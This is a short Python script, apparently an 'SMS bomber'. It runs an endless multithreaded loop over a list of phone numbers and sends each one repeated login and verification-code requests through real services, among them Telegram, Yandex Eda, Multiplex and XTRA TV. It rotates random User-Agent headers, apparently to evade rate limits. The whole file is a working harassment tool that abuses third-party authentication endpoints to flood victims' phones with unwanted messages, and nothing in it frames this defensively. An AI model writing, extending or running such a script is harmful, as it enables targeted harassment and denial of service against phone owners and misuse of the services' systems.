from user_agent import generate_user_agent
import threading
import requests

array = [
'XXXXXXXXXXXX',
'XXXXXXXXXXXX',
'XXXXXXXXXXXX',
]

threads = 3

def run(i):
	a = i

	while True:
		if a > len(array) - 1:
			a = i
			if a > len(array) - 1:
				break

		head = {'User-Agent': generate_user_agent(), 'X-Requested-With': 'XMLHttpRequest'}

		try:
			response = requests.post('https://auth.multiplex.ua/login', json = {'login': array[a]}, headers = head)
			print('Multiplex: ' + str(response.text))
		except Exception:
			print('Fuck')

		try:
			response = requests.post('https://eda.yandex/api/v1/user/request_authentication_code', json = {'phone_number': '+' + array[a]}, headers = head)
			print('Yandex eda: ' + str(response.text))
		except Exception:
			print('Fuck')

		try:
			response = requests.post('https://md-fashion.com.ua/bpm/validate-contact', data = {'phone': '+' + array[a]}, headers = head)
			print('MD Fashion: ' + str(response.text))
		except Exception:
			print('Fuck')

		try:
			response = requests.post('https://my.telegram.org/auth/send_password', data = {'phone': '+' + array[a]}, headers = head)
			print('Telegram: ' + str(response.text))
		except Exception:
			print('Fuck')
		'''
		try:
			response = requests.post('https://taxovichkof.ru/api/userSendSms', data = {'username': '+' + array[a], 'lang': 'ru', 'city': 'spb'}, headers = head)
			print('Taxovichkof: ' + str(response.text))
		except Exception:
			print('Fuck')'''

		try:
			response = requests.post('https://my.xtra.tv/api/signup?lang=uk', data = {'phone': '+' + array[a]}, headers = head)
			print('XTRA TV: ' + str(response.text))
		except Exception:
			print('Fuck')
		
		try:
			response = requests.get('https://findclone.ru/register', data = {'phone': array[a]}, headers = head)
			print('FindClone: ' + str(response.text))
		except Exception:
			print('Fuck')

		a += threads

for i in range(threads): threading.Thread(target = run, args = [i]).start()